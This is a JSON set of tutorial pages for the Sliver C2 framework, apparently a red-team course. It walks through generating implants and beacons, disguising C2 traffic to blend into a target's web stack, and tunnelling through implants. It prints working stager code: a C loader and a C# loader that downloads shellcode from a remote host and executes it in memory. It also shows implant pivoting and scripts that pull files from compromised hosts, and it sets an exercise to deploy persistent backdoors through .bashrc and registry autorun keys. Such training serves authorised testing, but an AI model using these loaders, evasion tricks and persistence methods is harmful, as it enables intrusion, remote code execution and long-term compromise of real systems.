{"tutorials":[{"name":"1 - Getting Started","content":"This course will use the latest Sliver build, you can download it from [insert local web server].\n\n`sliver-server` is the binary you want to use to run the Sliver C2 server, `sliver-client` is solely a client to connect to a Sliver C2 server. Sliver server also acts as a client on its own, so you don’t necessarily run sliver server and client separately.\n\nFirst time running Sliver will take a couple seconds as its retrieving its dependencies, consecutive executions will be much faster. Go ahead and launch the `sliver-server`.\n\n```asciinema\n{\"src\": \"/asciinema/startup.cast\", \"cols\": \"132\", \"rows\": \"28\", \"idleTimeLimit\": 8}\n```\n\nLet's take a couple minutes to discuss what Sliver actually is and how its setup.\n\n![Alt text](/images/Architecture.png)\n\nNow that Sliver is running, lets generate and execute your first implant to try out some of the basic features of Sliver, for now we’re going to run everything on the local host.\n\nHere's what we're going to do: \n* Generate your implant using the `generate` command as shown below.\n* Start HTTP listener on port 80\n* Execute implant in a separate terminal\n\n```asciinema\n{\"src\": \"/asciinema/first-implant.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nNow let’s select our implant and run our first command using the `use` command.\n\n```bash\n[server] sliver > use\n? Select a session or beacon: \nSESSION  1884a365  RELATED_EARDRUM  [::1]:49153      test.local  tester  darwin/amd64\n[*] Active session RELATED_EARDRUM (1884a365-085f-4506-b28e-80c481730fd0)\n\n[server] sliver (RELATED_EARDRUM) > pwd\n\n[*] /Users/tester/tools\n```\n\nOnce you have reached this point, go ahead and explore some of the commands listed below. In each case first checkout the commands help using the **`-h`** flag then try it out!\n\n```bash\nExploring and interacting with the filesystem\n\nFilesystem\n  cat               Dump file to stdout\n  cd                Change directory\n  cp                Copy a file\n  download          Download a file\n  grep              Search for strings that match a regex within a file or directory\n  head              Grab the first number of bytes or lines from a file\n  ls                List current directory\n  memfiles          List current memfiles\n  mkdir             Make a directory\n  mount             Get information on mounted filesystems\n  mv                Move or rename a file\n  pwd               Print working directory\n  rm                Remove a file or directory\n  tail              Grab the last number of bytes or lines from a file\n  upload            Upload a file\n```\n\n```asciinema\n{\"src\": \"/asciinema/filesystem.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nGetting some environmental information\n```bash\nInfo\n  env               List environment variables\n  getgid            Get session process GID\n  getpid            Get session pid\n  getuid            Get session process UID\n  info              Get session info\n  ping              Send round trip message to implant (does not use ICMP)\n  screenshot        Take a screenshot\n  whoami            Get session user execution context\n```\nExecute a binary\n\n```asciinema\n{\"src\": \"/asciinema/execute.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nRunning an interactive shell\n\n```asciinema\n{\"src\": \"/asciinema/shell.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```"},{"name":"2 - Beacons vs Sessions","content":"# Beacons vs Sessions\n\nSliver implants support two types of connections, sessions and beacons.\n\nSessions use long-poling connections, which means they use a single TCP connection which is constantly open. Beacons on the other hand call back periodically, and will sleep when not active which can help keep their presence hidden.\n\nTypically during an engagement you will want to deploy a beacon on the target system, and switch to a session while doing more active enumeration activities.\n\nLet’s start with generating and deploying a beacon using `http`.\n\n```asciinema\n{\"src\": \"/asciinema/beacon_generation.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nYou can see the beacon callback times either in the `info` command or using `beacons watch`.\n\n```bash\n[server] sliver > beacons watch\n\n ID         Name            Transport   Username          Operating System   Last Check-In   Next Check-In\n========== =============== =========== ================= ================== =============== ===============\n 942c647c   TIRED_GIRAFFE   http(s)     tester   darwin/amd64       52s             12s\n\n```\n\nBeacon callback times and jitter can be set either during generation or on the fly using the `reconfig` command.\n\nThe example below sets the callback time to 5s with a 1s jitter.\n\n```bash\n[server] sliver (TIRED_GIRAFFE) > reconfig -i 5s -j 1s\n\n[*] Tasked beacon TIRED_GIRAFFE (b8aa6fd8)\n\n[+] TIRED_GIRAFFE completed task b8aa6fd8\n\n[*] Reconfigured beacon\n\n[server] sliver (TIRED_GIRAFFE) > info\n\n         Beacon ID: 942c647c-8409-4877-9fa2-b84a7f27ad45\n              Name: TIRED_GIRAFFE\n          Hostname: tester.local\n              UUID: c6de1a44-016a-5fbe-b76a-da56af41316d\n          Username: tester\n               UID: 501\n               GID: 20\n               PID: 55879\n                OS: darwin\n           Version:\n            Locale:\n              Arch: amd64\n         Active C2: https://127.0.0.1\n    Remote Address: 127.0.0.1:51803\n         Proxy URL:\n          Interval: 1m0s\n            Jitter: 30s\n     First Contact: Wed Apr 19 01:14:21 CEST 2023 (10m30s ago)\n      Last Checkin: Wed Apr 19 01:18:20 CEST 2023 (6m31s ago)\n      Next Checkin: Wed Apr 19 01:19:46 CEST 2023 (5m5s ago)\n```\n\nCommands issued for beacons can be viewed using `tasks`, the task state will indicate wether the command has completed or not.  The results of previously run tasks can be viewed using `tasks fetch`.\n\n```asciinema\n{\"src\": \"/asciinema/beacon_tasks.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nbeacon_tasks.cast\n\nSession can be spun up using the `interractive` command.\n\n```asciinema\n{\"src\": \"/asciinema/beacon_interractive.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nBecause of the differences between sessions and beacons, certain commands like `upload` or `download` are slower on beacons due to the callback time. Others such as socks5 are not supported and only allowed for sessions. As a rule of thumb anything requiring higher network bandwith should be run from a session.\n\nLet’s switch to our newly created session and spin-up a `socks5` proxy.\n\n```bash\n\nsocks\n[server] sliver (TIRED_GIRAFFE) > use\n\n? Select a session or beacon: SESSION  131a60b9  TIRED_GIRAFFE  127.0.0.1:51969  tester.local  tester  darwin/amd64\n[*] Active session TIRED_GIRAFFE (131a60b9-db4f-4913-9064-18a17a0f09ab)\n\n[server] sliver (TIRED_GIRAFFE) > socks5 start\n\n[*] Started SOCKS5 127.0.0.1 1081\n⚠️  In-band SOCKS proxies can be a little unstable depending on protocol\n```\n\nYou can then point your browser to port 1081 to tunnel traffic through the implant to your target’s local network.\n\nTry out some of the previous commands and compare behaviour on beacons and sessions. Once you are done, you should remember to close your session using the `close` command.\n"},{"name":"3 - C2 Profiles and configuration","content":"When generating implants sliver uses a C2Profile configuration, which will be use to generate the effective network configuration of the implant. For example if configured to use /admin and /demo as callback urls, it might use one, the other or both allowing two implants using the same configuration to still seem slightly different from a network traffic perspective.\n\nC2 profile configurations can be seen using the `c2profile` command, which also allows import and export features.\n\nThe full list of possible configuration option can be found in the references section below, but for now lets instead customise the existing configuration.\n\nLets imagine we’re trying to breach a customer we've noticed uses ruby-on-rails for their applications. By default sliver will use the following extensions:\n\n- `.woff` for staging\n- `.js` for poll requests\n- `.html` for key exchanges\n- `.png` for close session\n- `.php` for session messages\n\nWe will need to update the session messages and staging with something more realistic and place all references to `woff` or `php` with something less suspicious like `css`, `rb` or `erb`.\n\nWe will also use a list of common Urls and filenames for Ruby on Rails like `https://github.com/danielmiessler/SecLists/blob/master/DiscoveryWeb-Content/ror.txt` for the `*_files` and `*_paths` variables. You could also reuse Urls discovered while enumerating your target's external perimeter in a similar way.\n\nWe will split the urls using a script like the example below, and then update the files and paths variables in our configuration file.\n\n```python\nimport json\nimport math\nimport sys\nimport random\n\n\ndef updateProfile(c2ProfileName, urls, cookieName):\n    data = open(urls).readlines()\n    c2Profile = open(c2ProfileName, \"r\").read()\n    jsonC2Profile = json.loads(c2Profile)\n\n    paths, filenames, extensions = [], [], []\n    for line in data:\n        line = line.strip()\n        if \".\" in line:\n            extensions.append(line.split(\".\")[-1])\n\n        if \"/\" in line:\n            segments = line.split(\"/\")\n            paths.extend(segments[:-1])\n            filenames.append(segments[-1].split(\".\")[0])\n\n    extensions = list(set(extensions))\n    if \"\" in extensions:\n        extensions.remove(\"\")\n    random.shuffle(extensions)\n\n    filenames = list(set(filenames))\n    if \"\" in filenames:\n        filenames.remove(\"\")\n\n    paths = list(set(paths))\n    if \"\" in paths:\n        paths.remove(\"\")\n\n    if len(extensions) < 5:\n        print(f'Got {len(extensions)} extensions, need at least 5.')\n        exit(0)\n\n    if len(paths) < 5:\n        print(f'Got {len(paths)} paths need at least 5.')\n        exit(0)\n\n    if len(filenames) < 5:\n        print(f'Got {len(filenames)} paths need at least 5.')\n        exit(0)\n\n    exts = ['poll_file_ext','stager_file_ext', 'start_session_file_ext', 'session_file_ext', 'close_file_ext' ]\n    for ext in exts:\n        jsonC2Profile[\"implant_config\"][ext] = extensions[0]\n        extensions.pop(0)\n\n    pathTypes = ['poll_paths','stager_paths', 'session_paths', 'close_paths' ]\n    for x, pathType in enumerate(pathTypes):\n        jsonC2Profile[\"implant_config\"][pathType] =  paths[math.floor(x*(len(paths)/len(pathTypes))):math.floor((x+1)*(len(paths)/len(pathTypes)))]\n\n    fileTypes = ['poll_files','stager_files', 'session_files', 'close_files']\n    for x, fileType in enumerate(fileTypes):\n        jsonC2Profile[\"implant_config\"][fileType] = filenames[math.floor(x*(len(filenames)/len(fileTypes))):math.floor((x+1)*(len(filenames)/len(fileTypes)))]\n\n    jsonC2Profile[\"server_config\"][\"cookies\"] = [cookieName]\n    c2Profile = open(c2ProfileName, \"w\")\n    c2Profile.write(json.dumps(jsonC2Profile))\n    print(\"C2 Profile updated !\")\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 4:\n        print(\"Usage: updateProfile.py myC2Profile myurls.txt cookieName\")\n        exit(0)\n\n    updateProfile(sys.argv[1], sys.argv[2], sys.argv[3])\n```\nThe example below demonstrates how to change and import a profile.\n\n```asciinema\n{\"src\": \"/asciinema/custom_c2profile.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nAt this point we can generate a new implant using our new profile.\n\n```asciinema\n{\"src\": \"/asciinema/implant_custom_c2profile.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nIf we review the debug logs of our implant we can see that the connections now use our new profile.\n\n```asciinema\n{\"src\": \"/asciinema/implant_debug_logs.cast\", \"cols\": \"132\", \"rows\": \"28\", \"idleTimeLimit\": 8}\n```\n\nIdeally during engagements your recon phase should inform your C2 infrastructure, reusing similar hosting providers, technologies and communication protocols can help your implant fly under the radar. \n\n"},{"name":"4 - HTTP Payload staging","content":"# Stagers\n\nWhen using Sliver during a live engagement, you’re going to need to use custom stagers, which are essentially a first binary or commandline that will retrieve and/or load Sliver into memory on your target system. Sliver can generate shellcode for your stager to execute by using the `profiles` command.\n\nFor this exercise we will create a new beacon profile and prepare to stage it.\n\n```asciinema\n{\"src\": \"/asciinema/create_profile.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nIf you look at the generated implant, you'll notice the `ID` field has been populated. When downloading your payload from the staging server your URL needs to be in the form of:\n```\nhttps://sliver-ip/whatever.stager_file_ext?x=yourID\n```\n\nThere is a lot of flexibility in the form of this URL, the conditions for successfull staging are:\n* the file extension needs to match the c2 profile's stager_file_ext\n* there has to be a one character http url parameter\n* the digits found in the ID need to match an implant ID, if your implant ID is 1234, abcd1234, 12beu34 are all valid values\n\nTo exposed a payload externally you need to use the `implants stage` command and specifically select the implant to be exposed.\n\n```asciinema\n{\"src\": \"/asciinema/stage_implant.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\n\n## Metasploit\n\nYou can generate msfvenom shellcode to connect back to our stage listener and retrieve the second stage payload, however you’ll need to include the `--prepend-size` argument to the stage listener as Metasploit payloads require the length to be prepended to the stage. You can either kill the previous stage listener using the `jobs -k` command or run the stage listener on a different port:\n\n```html\n[server] sliver > stage-listener --url http://**%%LINUX_IPADDRESS%%**:7202 --profile profile1 --prepend-size\n\n[*] Sliver name for profile: IDEAL_THRONE\n[*] Job 2 (http) started\n```\n\nOnce you have the stage listener setup with prepend size, you can generate the stager shellcode:\n\n```bash\n[server] sliver > generate stager --lhost **%%LINUX_IPADDRESS%%** --lport 7202 --protocol http --save /tmp --format c\n\n[*] Sliver implant stager saved to: /tmp/HOLLOW_CHINO\n```\n\nCreate a new file on the Linux box with the following contents and replace the `%%STAGE_SHELLCODE%%` field with the shellcode previously created:\n\n```bash\n#include \"windows.h\"\n\nint main()\n{\n        unsigned char buf[] = **%%STAGE_SHELLCODE%%** ;\n    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    memcpy(exec, buf, sizeof buf);\n    ((void(*)())exec)();\n\n    return 0;\n}\n```\n\nFinally compile the payload.\n\n```bash\nx86_64-w64-mingw32-gcc -o stage.exe stager.c\n```\n\nOnce the executable is copied over to a windows host and run you should see a session connect back to your host.\n\n## Custom stager\n\nYou can also use a custom stager that just retrieves sliver shellcode directly and loads it in memory similarly to the previous stager.\n\n```bash\nusing System;\nusing System.Net.Http;\nusing System.Runtime.InteropServices;\nusing System.Threading.Tasks;\n\nnamespace ConsoleApp1\n{\n    internal class Program\n    {\n        [DllImport(\"kernel32.dll\")]\n        public static extern IntPtr VirtualAlloc(\n           IntPtr lpAddress,\n           uint dwSize,\n           AllocationType flAllocationType,\n           MemoryProtection flProtect);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern IntPtr CreateThread(\n            IntPtr lpThreadAttributes,\n            uint dwStackSize,\n            IntPtr lpStartAddress,\n            IntPtr lpParameter,\n            uint dwCreationFlags,\n            out IntPtr lpThreadId);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern bool VirtualProtect(\n            IntPtr lpAddress,\n            uint dwSize,\n            MemoryProtection flNewProtect,\n            out MemoryProtection lpflOldProtect);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern uint WaitForSingleObject(\n            IntPtr hHandle,\n            uint dwMilliseconds);\n\n        [Flags]\n        public enum AllocationType\n        {\n            Commit = 0x1000,\n            Reserve = 0x2000,\n            Decommit = 0x4000,\n            Release = 0x8000,\n            Reset = 0x80000,\n            Physical = 0x400000,\n            TopDown = 0x100000,\n            WriteWatch = 0x200000,\n            LargePages = 0x20000000\n        }\n\n        [Flags]\n        public enum MemoryProtection\n        {\n            Execute = 0x10,\n            ExecuteRead = 0x20,\n            ExecuteReadWrite = 0x40,\n            ExecuteWriteCopy = 0x80,\n            NoAccess = 0x01,\n            ReadOnly = 0x02,\n            ReadWrite = 0x04,\n            WriteCopy = 0x08,\n            GuardModifierflag = 0x100,\n            NoCacheModifierflag = 0x200,\n            WriteCombineModifierflag = 0x400\n        }\n\n    static async Task Main(string[] args)\n        {\n\n            byte[] shellcode;\n\n            using (var handler = new HttpClientHandler())\n            {\n                // ignore ssl, because self-signed\n                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;\n\n                using (var client = new HttpClient(handler))\n                {\n                    // Download the shellcode\n                    shellcode = await client.GetByteArrayAsync(\"http://10.0.0.4:7200/whatever.woff\");\n                }\n            }\n\n            // Allocate a region of memory in this process as RW\n            var baseAddress = VirtualAlloc(\n                IntPtr.Zero,\n                (uint)shellcode.Length,\n                AllocationType.Commit | AllocationType.Reserve,\n                MemoryProtection.ReadWrite);\n\n            // Copy the shellcode into the memory region\n            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);\n\n            // Change memory region to RX\n            VirtualProtect(\n                baseAddress,\n                (uint)shellcode.Length,\n                MemoryProtection.ExecuteRead,\n                out _);\n\n            // Execute shellcode\n            var hThread = CreateThread(\n                IntPtr.Zero,\n                0,\n                baseAddress,\n                IntPtr.Zero,\n                0,\n                out _);\n            // Wait infinitely on this thread to stop the process exiting\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n        }\n    }\n}\n```\n\n## References\n\n- [https://github.com/BishopFox/sliver/wiki/Stagers](https://github.com/BishopFox/sliver/wiki/Stagers)\n"},{"name":"5 - Pivots","content":"# Pivots\n\nPivots allow routing implant traffic through other implants. This can be usefull in environments that don’t have any outbound access, but are reachable from other parts of the network that you have access to.\n\nSliver supports two types of pivots, tcp which can be used on all operating systems and named pipes which are windows only.\n\nIn both cases the workflow is relatively similar, as a first step select a session and setup a pivot listener.\n\n```bash\n[server] sliver (INNER_GO-KART) > pivots tcp\n\n[*] Started tcp pivot listener :9898 with id 1\n\n[server] sliver (INNER_GO-KART) > pivots\n\n ID   Protocol   Bind Address   Number Of Pivots\n==== ========== ============== ==================\n  1   TCP        :9898                         0\n```\n\nThe listening port and interface can be configured during creation.\n\nThe next step is to generate a payload that will connect to our listener.\n\n```bash\n[server] sliver (INNER_GO-KART) > generate --tcp-pivot 127.0.0.1 --os macos\n\n[*] Generating new darwin/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed in 12s\n[*] Implant saved to /Users/tester/tools/VALUABLE_SICK\n```\n\nExecuting this payload will cause it to connect back through our original implant and then back to our C2 server.\n"},{"name":"6 - Scripting","content":"## Sliver Reactions\n\nReactions are a basic way to automate tasks in the sliver console, they allow you to specify sliver commands to run on a list of events.\n\n```bash\nReactable Events:\n   session-connected  Triggered when a new session is opened to a target\n     session-updated  Triggered on changes to session metadata\nsession-disconnected  Triggered when a session is closed (for any reason)\n              canary  Triggered when a canary is burned or created\n          watchtower  Triggered when implants are discovered on threat intel platforms\n          loot-added  Triggered when a new piece of loot is added to the server\n        loot-removed  Triggered when a piece of loot is removed from the server\n```\n\nLet’s go ahead and create a reaction to list the current directory and environment variables when a new session checks in.\n\n```bash\nreaction set -e \"session-connected\"\n\n[*] Setting reaction to: Session Opened\n\n? Enter commands:  [Enter 2 empty lines to finish]pwd\nenv\n? Enter commands:\npwd\nenv\n\n[*] Set reaction to session-connected (id: 1)\n```\n\nThe reaction is now set, if you spin up a new session these commands will be automatically run on that session’s initial connection.\n\n```bash\n[*] Session 99c7a639 UNEXPECTED_PORTER - 127.0.0.1:59966 (test.local) - darwin/amd64 - Thu, 04 May 2023 09:04:58 CEST\n\n[*] Execute reaction: 'pwd'\n\n[*] /Users/tester\n\n[*] Execute reaction: 'env'\n\nPWD=/Users/tester\nCOLORTERM=truecolor\n...\n```\n\nYou can remove reactions using `reaction unset`.\n\nHowever, there are a couple of limitations to keep in mind when using reactions, first off these are run in the console you are currently using, which is not necessarily the server console. So if you are connected to a sliver server using the sliver client, if you disconnect the client the reactions are no longer running. \n\nSecondly reactions are a relatively basic mechanism, you can’t use any conditional statements or more complex background tasks with them. For more complex use-cases you can instead write your own client in Python or Typescript to connect to the server over gRPC, which we’ll cover in the next session.\n\n## Sliver-py\n\nFor the purposes of this tutorial we’ll write our extensions using Python3, however the same result is achievable using Typescript, Golang or any other language that can handle gRPC.\n\nFirst, install the sliver-py extension using pip.\n\n```bash\npip3 install sliver-py\n```\n\nSince our extension is essentially going to be another client connection to the sliver server, you’ll also need to enable multiplayer mode and generate a new profile\n\n```bash\n[server] sliver > multiplayer\n\n[*] Multiplayer mode enabled!\n\n[server] sliver > new-operator -n tester -l 127.0.0.1\n\n[*] Generating new client certificate, please wait ...\n[*] Saved new client config to: /Users/tester/tools/tester_127.0.0.1.cfg\n```\n\nWe now have everything we need to start writing our scripts, let’s run our first example interactively in a Python shell. In this session we recommend using `ipython3` , you can install this by using pip:\n\n```html\npip3 install ipython3\n```\n\nWe first need to import a few dependencies, `SliverClientConfig` which is used to parse the client config we’ve just created and `SliverClient` which will handle the connection to the backend server.\n\n```bash\ntester@test ~/t/sliver> ipython3\nPython 3.9.16 (main, Dec  7 2022, 10:06:04)\nType 'copyright', 'credits' or 'license' for more information\nIPython 8.0.1 -- An enhanced Interactive Python. Type '?' for help.\n\nIn [1]: from sliver import SliverClientConfig, SliverClient\n\nIn [2]: DEFAULT_CONFIG = \"/Users/tester/tools/tester_127.0.0.1.cfg\"\n\nIn [3]: config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG)\n\nIn [4]: client = SliverClient(config)\n\nIn [5]: await client.connect()\nOut[5]:\nMajor: 1\nMinor: 5\nPatch: 37\nCommit: \"0a43dc688ffb31a0a38511c47e8547a44a6918d4\"\nCompiledAt: 1681408237\nOS: \"darwin\"\nArch: \"arm64\"\n```\n\nFrom this point on we can use the client object to interact with the server, let’s start with listing any sessions or beacons that might be currently connected.\n\n```bash\nIn [6]: beacons = await client.beacons()\n\nIn [7]: sessions = await client.sessions()\n\nIn [8]: beacons\nOut[8]: []\n\nIn [9]: sessions\nOut[9]:\n[ID: \"f80ec897-0870-4f03-a1b1-364e5a0d243c\"\n Name: \"UNEXPECTED_PORTER\"\n Hostname: \"test.local\"\n UUID: \"c6de1a44-016a-5fbe-b76a-da56af41316d\"\n Username: \"tester\"\n UID: \"501\"\n GID: \"20\"\n OS: \"darwin\"\n Arch: \"amd64\"\n Transport: \"http(s)\"\n RemoteAddress: \"127.0.0.1:60218\"\n PID: 74773\n Filename: \"/Users/tester/tools/UNEXPECTED_PORTER\"\n LastCheckin: 1683185925\n ActiveC2: \"http://127.0.0.1\"\n ReconnectInterval: 60000000000\n PeerID: 4416183373589698218\n FirstContact: 1683185429]\n```\n\nTo run commands on this session you’ll need to create an InteractiveSession object.\n\n```bash\nIn [10]: interract = await client.interact_session(\"f80ec897-0870-4f03-a1b1-364e5a0d243c\")\n\nIn [11]: await interract.pwd()\nOut[11]: Path: \"/Users/tester\"\n```\n\nNow that we’ve got the basics of connecting to sliver and running commands down let’s write a more useful script that will display the hosts file when a new session checks in. Our goal is to first identify the Operating System, and then based on that retrieve and display the contents of the hosts file if it exists. Because this script will wait and react to events emitted by the Sliver server, we’re going to use `asyncio` to write our client.\n\n```bash\n#!/usr/bin/env python3\n\nimport os\nimport asyncio\nfrom sliver import SliverClientConfig, SliverClient\nimport gzip\n\nDEFAULT_CONFIG = \"/Users/tester/tools/neo_127.0.0.1.cfg\"\n\nasync def main():\n    ''' Client connect example '''\n    config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG)\n    client = SliverClient(config)\n    await client.connect()\n\n\t\tasync for event in client.on('session-connected'):\n        print('Session %s just connected !' % event.Session.ID)\n\nif __name__ == '__main__':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())\n```\n\nAs shown above we can access the session object through `event.Session`. Let’s go ahead and add a few conditions based on the operating system.\n\n```bash\nif event.Session.OS == \"darwin\":\n            print('Session is running on macOS')\n\nelif event.Session.OS == \"Linux\":\n            print('Session is running on Linux')\nelif event.Session.OS == \"Windows\"\n            print('Session is running on Windows')\nelse:\n            print('Session is running on %s', event.Session.OS)\n```\n\nLet’s setup an InteractiveSession object like previously.\n\n```bash\ninteract = await client.interact_session(event.Session.ID)\n```\n\nWe’re going to start with writing the code for Linux and Macos, since in their case the file is located in the same place. First we check if the file exists, then we download and decompress it to display its contents using gzip.\n\n```bash\nfile_listing = await interact.ls(\"/etc/hosts\")\nif file_listing.Exists:\n\tgzipFile = await interact.download(\"/etc/hosts\")\n  contents = gzip.decompress(gzipFile.Data)\n  print('%r' % contents)\n```\n\nThe code for Windows is relatively similar the only major difference being the file location.\n\n```bash\nfile_listing = await interact.ls(\"C:/Windows/System32/drivers/etc/hosts\")\nif file_listing.Exists:\n\tgzipFile = await interact.download(\"C:/Windows/System32/drivers/etc/hosts\")\n  contents = gzip.decompress(gzipFile.Data)\n  print('%r' % contents)\n```\n\nIf we run our script and spin up a few sessions we should start to see hosts files being retrieved.\n\n```bash\npython3.11 autocat.py\nAutomatically interacting with session 16338c85-b670-44ab-ac83-2df885654b07\nb\"# Copyright (c) 1993-2009 Microsoft Corp.\\r\\n#\\r\\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\\r\\n#\\r\\n# ...\n\nAutomatically interacting with session 93fcbab2-f00d-44a4-944a-e1ea8ec324e2\nb'##\\n# Host Database\\n#\\n# localhost is used to configure the loopback interface\\n# when the system is booting.  Do not change this entry.\\n##\\n127.0.0.1...\n```\n\nAs an exercise, build automated backdoor deployer which first identifies the target operating system and then deploys a corresponding backdoor, in the case of Linux or Macos you can backdoor a `.bashrc` file to run a previously uploaded binary in the background, in the case of Windows you can use the registry commands to deploy a new `autorun` key.\n\nHere are a couple hints:\n\n- Start with generating sliver implants for all your target systems, on implant connection you’ll want to upload them somewhere on disc\n- In the cases of Linux and Macos you’ll want to download the `.bashrc` file, decompress and modify it locally before re-uploading it. The upload command should look like this `await interract.upload(\"/home/target/.bashrc\", contents + b'\\r\\necho \"pwned !\"')`.\n- For Windows you can look at the `registry_read` and `registry_create_key` functions.\n\n## References\n\n- [https://github.com/BishopFox/sliver/wiki/Writing-your-own-client](https://github.com/BishopFox/sliver/wiki/Writing-your-own-client)\n- [https://sliverpy.readthedocs.io/en/latest/](https://sliverpy.readthedocs.io/en/latest/)\n- [https://github.com/moloch--/sliver-py](https://github.com/moloch--/sliver-py)\n- [https://github.com/moloch--/sliver-script](https://github.com/moloch--/sliver-script)\n"},{"name":"7 - Assemblies and Bofs","content":""}]}